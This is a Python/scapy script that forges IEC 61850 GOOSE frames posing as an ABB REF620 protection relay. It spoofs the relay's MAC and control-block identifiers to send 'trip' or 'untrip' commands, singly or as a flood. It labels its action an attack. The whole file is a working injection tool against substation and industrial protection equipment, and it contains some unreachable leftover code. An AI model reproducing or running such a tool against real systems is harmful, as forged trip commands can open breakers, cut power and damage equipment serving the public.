from scapy.all import *
from scapy.layers.l2 import Ether
from scapy.layers.ntp import TimeStampField
import datetime
from binascii import unhexlify
import psutil  # Used for getting availible interfaces
import sys  # used for file path joining
import subprocess as sb

EXPORT_FILE = "out.txt"
st_num = 444


# Returns a "||" delimeted array of all the active internet interfaces
def getActiveInterfaceArray():
    addresses = psutil.net_if_addrs()
    stats = psutil.net_if_stats()

    available_interfaces = ""
    for intface, addr_list in addresses.items():
        if any(getattr(addr, 'address').startswith("169.254") for addr in addr_list):
            continue
        elif intface in stats and getattr(stats[intface], "isup"):
            available_interfaces += (intface + "||")

    return available_interfaces[:-2]  # to remove last delimeter


st_num = 444


def num2str(num):
    bytestring = bytearray()
    if num // 256 // 256 // 256 // 256 % 256 > 0:
        bytestring.append(num // 256 // 256 // 256 // 256 % 256)
    if num // 256 // 256 // 256 % 256 > 0:
        bytestring.append(num // 256 // 256 // 256 % 256)
    if num // 256 // 256 % 256 > 0:
        bytestring.append(num // 256 // 256 % 256)
    if num // 256 % 256 > 0:
        bytestring.append(num // 256 % 256)
    bytestring.append(num % 256)
    return bytestring


class GooseHeader(Packet):
    name = "Goose Header"
    fields_desc = [ShortField("appid", 1),
                   ShortField("length", 0),
                   ShortField("reserved1", None),
                   ShortField("reserved2", None)]


class GoosePDU(Packet):
    name = "Goose PDU"
    fields_desc = [ByteField("sequence_t", 0x61),
                   ConditionalField(ByteField("sequence_el", 0x81), lambda pkt: pkt.sequence_l > 127),
                   ByteField("sequence_l", 0),
                   ByteField("gocbRef_t", 0x80),
                   FieldLenField("gocbRef_l", None, length_of="gocbRef", fmt="B"),
                   StrLenField("gocbRef", None, length_from=lambda pkt: pkt.gocbRef_l),
                   ByteField("timeAllowedtoLive_t", 0x81),
                   FieldLenField("timeAllowedtoLive_l", None, length_of="timeAllowedtoLive", fmt="B"),
                   StrLenField("timeAllowedtoLive", None, length_from=lambda pkt: pkt.timeAllowedtoLive_l),
                   ByteField("datSet_t", 0x82),
                   FieldLenField("datSet_l", None, length_of="datSet", fmt="B"),
                   StrLenField("datSet", None, length_from=lambda pkt: pkt.datSet_l),
                   ByteField("goID_t", 0x83),
                   FieldLenField("goID_l", None, length_of="goID", fmt="B"),
                   StrLenField("goID", None, length_from=lambda pkt: pkt.goID_l),
                   ByteField("T_t", 0x84),
                   ByteField("T_l", 8),
                   TimeStampField("T", None),
                   ByteField("stNum_t", 0x85),
                   FieldLenField("stNum_l", None, length_of="stNum", fmt="B"),
                   StrLenField("stNum", None, length_from=lambda pkt: pkt.stNum_l),
                   ByteField("sqNum_t", 0x86),
                   FieldLenField("sqNum_l", None, length_of="sqNum", fmt="B"),
                   StrLenField("sqNum", None, length_from=lambda pkt: pkt.sqNum_l),
                   ByteField("simulation_t", 0x87),
                   ByteField("simulation_l", 1),
                   ByteField("simulation", None),
                   ByteField("confRev_t", 0x88),
                   FieldLenField("confRev_l", None, length_of="confRev", fmt="B"),
                   StrLenField("confRev", None, length_from=lambda pkt: pkt.confRev_l),
                   ByteField("ndsCom_t", 0x89),
                   ByteField("ndsCom_l", 1),
                   ByteField("ndsCom", None),
                   ByteField("numDatSetEntries_t", 0x8a),
                   FieldLenField("numDatSetEntries_l", None, length_of="numDatSetEntries", fmt="B"),
                   StrLenField("numDatSetEntries", None, length_from=lambda pkt: pkt.numDatSetEntries_l)
                   ]


def ref620_trip_packet(st_num):
    ethernet_mac = Ether(src='00:21:c1:22:c8:77', dst='01:0c:cd:01:00:03', type=0x88b8)
    goose_pdu = GoosePDU(gocbRef="REF62030LD0/LLN0$GO$gcbREF620",
                         timeAllowedtoLive=num2str(20000),
                         datSet="REF62030LD0/LLN0$REF620",
                         goID="REF62030LD0/LLN0.gcbREF620",
                         T=datetime.datetime.now(datetime.timezone.utc).timestamp(),
                         stNum=num2str(st_num),
                         sqNum=num2str(0),
                         simulation=0,
                         confRev=num2str(700),
                         ndsCom=0,
                         numDatSetEntries=num2str(4)
                         )
    goose_data = unhexlify("ab1084030300008301008403030000830101")
    goose_pdu.sequence_l = (len(goose_pdu) + len(goose_data) - 2)
    goose_header = GooseHeader(appid=4, length=len(goose_pdu) + len(goose_data) + 8)
    goose_packet = ethernet_mac / goose_header / goose_pdu / goose_data
    return goose_packet


def ref620_untrip_packet(st_num):
    ethernet_mac = Ether(src='00:21:c1:22:c8:77', dst='01:0c:cd:01:00:03', type=0x88b8)
    goose_pdu = GoosePDU(gocbRef="REF62030LD0/LLN0$GO$gcbREF620",
                         timeAllowedtoLive=num2str(20000),
                         datSet="REF62030LD0/LLN0$REF620",
                         goID="REF62030LD0/LLN0.gcbREF620",
                         T=datetime.datetime.now(datetime.timezone.utc).timestamp(),
                         stNum=num2str(st_num),
                         sqNum=num2str(0),
                         simulation=0,
                         confRev=num2str(700),
                         ndsCom=0,
                         numDatSetEntries=num2str(4)
                         )
    goose_data = unhexlify("ab1084030300008301018403030000830100")
    goose_pdu.sequence_l = (len(goose_pdu) + len(goose_data) - 2)
    goose_header = GooseHeader(appid=4, length=len(goose_pdu) + len(goose_data) + 8)
    goose_packet = ethernet_mac / goose_header / goose_pdu / goose_data
    return goose_packet


def ref620_trip(INTERFACE, PACKET_QTY):
    global st_num
    for i in range(PACKET_QTY):
        st_num = st_num + 1
        pkt = ref620_trip_packet(st_num)
        sendp(pkt, iface=INTERFACE)
    return "DONE"


def ref620_untrip(INTERFACE, PACKET_QTY):
    global st_num
    for i in range(PACKET_QTY):
        st_num = st_num + 1
        pkt = ref620_untrip_packet(st_num)
        sendp(pkt, iface=INTERFACE)
    return "DONE"

    # Old send packet
    # for i in range(PACKET_QTY):
    #     sendp(pkt, iface=INTERFACE)

    # Export built packet to file
    export_packet(raw(pkt), EXPORT_FILE)

    # Send packet appropriately
    if (PACKET_QTY):
        send_packet_with_c(INTERFACE, EXPORT_FILE, PACKET_QTY)
    else:
        send_packet_with_c_flood(INTERFACE, EXPORT_FILE)
    return "DONE"


# Exports the packet to a file
def export_packet(data, file_path):
    with open(file_path, "wb") as file:
        file.write(data)


def send_packet_with_c(INTERFACE, EXPORT_FILE, PACKET_QTY):
    # Start C Program
    process = sb.Popen(["./raw_packet_sender", INTERFACE, EXPORT_FILE, str(PACKET_QTY)], stdout=sb.PIPE,
                       universal_newlines=True)

    # Print program output as it happens
    while True:
        output = process.stdout.readline().strip()
        if output == '' and process.poll() is not None:
            break
        else:
            print(output)

    # Wait for program to finish
    return_code = process.wait()
    print("(send program returned with code " + str(return_code) + ")")


def send_packet_with_c_flood(INTERFACE, EXPORT_FILE):
    # Start C Program
    process = sb.Popen(["./raw_packet_sender_flood", INTERFACE, EXPORT_FILE], stdin=sb.PIPE, stdout=sb.PIPE,
                       universal_newlines=True)

    # Hardcoded input to C program
    # because I couldn't get better way to work
    input("Press enter to stop flood...")
    process.stdin.write('\n')
    process.stdin.flush()

    # Print program output as it happens
    while True:
        output = process.stdout.readline().strip()
        if output == '' and process.poll() is not None:
            break
        else:
            print(output)

    # Wait for program to finish
    return_code = process.wait()
    print("(send program returned with code " + str(return_code) + ")")


def main():
    # Get currently active interfaces and store in array
    interface_array = getActiveInterfaceArray().split("||")

    # Print out the active interface arrays with their option number
    interfacePrompt = "Please select an one of the following interfaces\n"
    for i in range(0, len(interface_array)):
        interfacePrompt += "   " + str(i + 1) + ") " + interface_array[i] + "\n"
    interfacePrompt = interfacePrompt[:-1]  # remove last newline
    print(interfacePrompt)

    # Get valid interface selection
    interfaceInput = int(input("Selection: "))
    while interfaceInput < 1 or interfaceInput > len(interface_array):
        print("Invalid interface selection!")
        print(interfacePrompt)
        interfaceInput = int(input("Selection: "))

    # Print out the availible actions with their option number
    actions = "   1) Trip\n" + "   2) Untrip"
    actionPrompt = "Please select one of the following actions:\n" + actions
    print(actionPrompt)

    # Get valid action selection
    actionInput = int(input("Selection: "))
    while actionInput < 1 or actionInput > 2:
        print("Invalid action selection!")
        print(actionPrompt)
        actionInput = int(input("Selection: "))

    # Print out the prompt for number of packets
    numPrompt = "Please enter the number of packets to send (0 for flood): "
    numInput = int(input(numPrompt))
    while numInput < 0:
        print("Invalid number of packets to send!")
        numInput = int(input(numPrompt))

    # Do selected attack on selected interface
    print("Performing attack...")
    if (actionInput == 1):
        ref620_trip(interface_array[interfaceInput - 1], numInput)
    elif (actionInput == 2):
        ref620_untrip(interface_array[interfaceInput - 1], numInput)
    print("Attack finished!")


if __name__ == "__main__":
    main()
